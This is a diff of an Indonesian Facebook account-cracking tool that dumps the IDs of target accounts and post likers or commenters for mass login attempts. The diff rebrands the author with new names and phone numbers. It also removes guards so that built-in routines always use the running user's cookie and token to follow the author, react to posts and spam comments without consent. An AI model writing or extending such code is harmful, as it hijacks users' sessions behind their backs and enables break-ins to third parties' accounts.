@@ -1,13 +1,13 @@
 ###----------[ AUTHOR & CREATOR ]---------- ###
 # ------ [ Gausah Dioprek Ntar Error ] ------ #
-Author    = 'Dapunta Khurayra X'
-Facebook  = 'Facebook.com/Dapunta.Khurayra.X'
-Instagram = 'Instagram.com/Dapunta.Ratya'
-Whatsapp  = '082245780524'
-YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
-Version   = '0.6'
-Denventa  = 1827084332
-Postingan = 10217173381366429
+Author    = 'Mhd Syafii'
+Facebook  = 'Facebook.com/fikritampan305'
+Instagram = 'Instagram.com/fi_sinaga'
+Whatsapp  = '081269496231'
+YouTube   = 'youtube.com/channel/UCr218CW05wRLJguvi9ijRrA'
+Version   = '11'
+Denventa  = 100004623370585
+Postingan = 1946312078866219
 
 ###----------[ IMPORT LIBRARY ]---------- ###
 import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,rich,shutil,webbrowser
@@ -155,16 +155,12 @@ class bot_author:
     def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
         with requests.Session() as xyz:
             try:
-                if ip_log != 1:pass
-                else:
                     for x in par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
                         if 'subscribe.php' in x['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie)
             except Exception as e:pass
     def get_likers(self,url,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
         with requests.Session() as xyz:
             try:
-                if ip_log != 1:pass
-                else:
                     bos = par(xyz.get(url,cookies=cookie).content,'html.parser')
                     for x in bos.find_all('a',href=True):
                         if 'Tanggapi' in x.text:
@@ -178,8 +174,6 @@ class bot_author:
         with requests.Session() as xyz:
             try:
                 for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
-                    if ip_log != 1:pass
-                    else:
                         komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
                         get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
                         if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(tampilan_menu())
@@ -494,7 +488,7 @@ def publik():
             print('\n%s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P))
             time.sleep(3)
             login()
-        print('       %s[%s•%s] %sContoh : 1827084332,607801156'%(J,P,J,P))
+        print('       %s[%s•%s] %sContoh : 100004623370585,100054984378683'%(J,P,J,P))
         tid = input('       %s[%s•%s] %sID Target : %s'%(J,P,J,P,J)).split(',')
         file_dump = 'dump/%s.json'%(tid[0])
         try:os.remove(file_dump)
@@ -634,7 +628,7 @@ def main_likers():
     urutan_crack = '0'
     try:
         cookie = {'cookie':open('login/cookie.json','r').read()}
-        print('       %s[%s•%s] %sContoh : 2089611468021009'%(J,P,J,P))
+        print('       %s[%s•%s] %sContoh : 2132526403578118'%(J,P,J,P))
         _query_ = input('       %s[%s•%s] %sID Postingan : %s'%(J,P,J,P,J))
         print('')
     except Exception as e:kecuali(e)
@@ -743,7 +737,7 @@ class komen:
         urutan_crack = '0'
         try:
             cookie = {'cookie':open('login/cookie.json','r').read()}
-            print('       %s[%s•%s] %sContoh : 2089611468021009'%(J,P,J,P))
+            print('       %s[%s•%s] %sContoh : 2132526403578118'%(J,P,J,P))
             put = input('       %s[%s•%s] %sID Postingan : %s'%(J,P,J,P,J))
             url = 'https://mbasic.facebook.com/'+put
             self.file_dump = ('dump/%s.json'%(put))
